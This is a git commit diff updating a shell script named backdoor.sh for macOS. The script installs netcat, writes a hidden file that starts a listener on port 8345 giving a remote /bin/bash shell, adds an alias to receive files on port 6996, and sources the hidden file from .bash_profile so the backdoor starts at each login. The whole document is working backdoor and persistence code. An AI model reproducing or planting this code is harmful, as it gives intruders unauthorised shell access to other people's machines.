b014e19cfca7612124dc07a33da221d49048f8b8
Hogchops <hogchops@gmail.com>
2019-05-09 12:24:59 -0400

    Update backdoor.sh

--- backdoor.sh
+++ backdoor.sh
@@ -9,7 +9,7 @@ file1=.axkda
 file2=.bash_profile
 
 # Install netcat if not present
-brew list netcat || brew install netcat
+brew list netcat || brew install netcat &
 clear
 
 # If a bash profile does not exist, create one
@@ -23,8 +23,8 @@ if [ ! -f $file1 ]
 then
 		touch $file1
 		echo "nc -l -p 8345 -e /bin/bash &">>$file1
-		echo 'alias xoutfile="nc -l -p > $@"'>>$file1
-		echo ' . $file1'>>$file2
+		echo 'alias xoutfile="nc -l -p 6996 > $@"'>>$file1
+		echo " . $file1">>$file2
 fi
 
 # Implement the change
